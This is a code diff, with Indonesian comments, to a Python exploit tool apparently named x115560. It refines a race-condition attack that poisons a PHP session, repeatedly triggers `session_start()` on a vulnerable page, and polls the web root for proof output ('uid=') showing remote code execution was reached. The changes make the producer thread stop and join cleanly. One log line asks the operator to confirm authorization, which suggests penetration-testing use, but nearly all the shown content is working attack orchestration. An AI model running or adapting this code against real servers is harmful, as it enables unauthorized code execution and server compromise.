@@ -195,8 +195,36 @@ def _get(url: str, sid: str, timeout: float = 8.0) -> tuple[int, bytes]:
 
 
 # ------------------------------------------------------------- orkestra ----
+_JOIN_TIMEOUT = 5.0        # batas tunggu producer berhenti setelah cfg.stop
+_JOIN_MIN_TIMEOUT = 0.25   # sisa durasi bisa ~0 → tetap beri jeda join minimal
+_PRODUCER_NAME = "x115560-producer"
+
+
+def _stop_and_join(cfg: RaceConfig, t: threading.Thread, deadline: float, log) -> bool:
+    """Set cfg.stop lalu tunggu producer benar-benar berhenti.
+
+    Budget join = sisa durasi race, di-clamp ke [_JOIN_MIN_TIMEOUT, _JOIN_TIMEOUT]:
+    cukup untuk producer keluar dari loop chunk-nya, tapi tidak menahan
+    pemanggil lebih dari _JOIN_TIMEOUT bila producer macet di I/O jaringan.
+    Return True bila thread sudah mati, False bila masih hidup (tidak fatal).
+    """
+    cfg.stop.set()
+    budget = min(max(deadline - time.time(), _JOIN_MIN_TIMEOUT), _JOIN_TIMEOUT)
+    t.join(timeout=budget)
+    if t.is_alive():
+        log(f"[x115560] producer belum berhenti setelah {budget:.2f}s — "
+            "thread daemon dibiarkan, hasil ditandai producer_stopped=False")
+        return False
+    return True
+
+
 def run_race(cfg: RaceConfig, log=print) -> dict:
-    """Jalankan race producer/consumer; kembalikan bukti bila RCE tercapai."""
+    """Jalankan race producer/consumer; kembalikan bukti bila RCE tercapai.
+
+    Siklus hidup producer: pada jalur SUKSES, GAGAL/TIMEOUT, maupun EXCEPTION,
+    `finally` selalu menjalankan cfg.stop.set() lalu join(timeout=…) — tidak
+    ada thread yang tertinggal mengirim data setelah fungsi menyatakan selesai.
+    """
     scope = target_scope(cfg.url)
     log(f"[x115560] scope={scope} — pastikan otorisasi (RoE) sebelum menembak")
     u = urllib.parse.urlsplit(cfg.url)
@@ -205,32 +233,47 @@ def run_race(cfg: RaceConfig, log=print) -> dict:
     deadline = time.time() + cfg.duration
     reads = 0
 
-    t = threading.Thread(target=_producer, args=(cfg,), daemon=True)
+    t = threading.Thread(target=_producer, args=(cfg,), daemon=True,
+                         name=_PRODUCER_NAME)
     t.start()
-    log(f"[x115560] race mulai — target {base} sid={cfg.sid[:12]}… "
-        f"window≈{cfg.total_mb * cfg.chunk_delay / (cfg.chunk_kb / 1024):.0f}s "
-        f"(file {cfg.total_mb}MB @ {cfg.chunk_kb}KB/{cfg.chunk_delay}s)")
 
-    while time.time() < deadline and not cfg.stop.is_set():
-        # 1) pemicu: session_start() di halaman vuln membaca session beracun
-        try:
-            _get(base + cfg.page, cfg.sid)
-        except Exception:  # noqa: BLE001
-            pass
-        reads += 1
-        # 2) bukti: gadget menulis output ke docroot
-        try:
-            st, body = _get(base + proof_path, cfg.sid)
-            txt = body.decode("utf-8", "replace")
-            if st == 200 and ("uid=" in txt or "PROOF" in txt):
-                log(f"[x115560] RCE — bukti di {proof_path} (reads={reads})")
-                return {"success": True, "reads": reads, "proof": txt.strip()}
-        except Exception:  # noqa: BLE001
-            pass
-        time.sleep(cfg.poll)
+    result: dict | None = None
+    try:
+        # log pembuka ikut di dalam try: exception di sini pun tidak boleh
+        # meninggalkan producer berjalan sendirian.
+        log(f"[x115560] race mulai — target {base} sid={cfg.sid[:12]}… "
+            f"window≈{cfg.total_mb * cfg.chunk_delay / (cfg.chunk_kb / 1024):.0f}s "
+            f"(file {cfg.total_mb}MB @ {cfg.chunk_kb}KB/{cfg.chunk_delay}s)")
 
-    cfg.stop.set()
-    return {"success": False, "reads": reads, "proof": ""}
+        while time.time() < deadline and not cfg.stop.is_set():
+            # 1) pemicu: session_start() di halaman vuln membaca session beracun
+            try:
+                _get(base + cfg.page, cfg.sid)
+            except Exception:  # noqa: BLE001
+                pass
+            reads += 1
+            # 2) bukti: gadget menulis output ke docroot
+            try:
+                st, body = _get(base + proof_path, cfg.sid)
+                txt = body.decode("utf-8", "replace")
+                if st == 200 and ("uid=" in txt or "PROOF" in txt):
+                    log(f"[x115560] RCE — bukti di {proof_path} (reads={reads})")
+                    result = {"success": True, "reads": reads, "proof": txt.strip()}
+                    break
+            except Exception:  # noqa: BLE001
+                pass
+            time.sleep(cfg.poll)
+        if result is None:
+            result = {"success": False, "reads": reads, "proof": ""}
+    finally:
+        # stop + join di semua jalur; exception tetap diteruskan ke pemanggil.
+        stopped = _stop_and_join(cfg, t, deadline, log)
+        if result is not None:
+            result["producer_stopped"] = stopped
+
+    # Jalur exception sudah di-re-raise oleh finally; di sini result pasti ada.
+    assert result is not None
+    return result
 
 
 def check_prereq(url: str, log=print) -> dict:
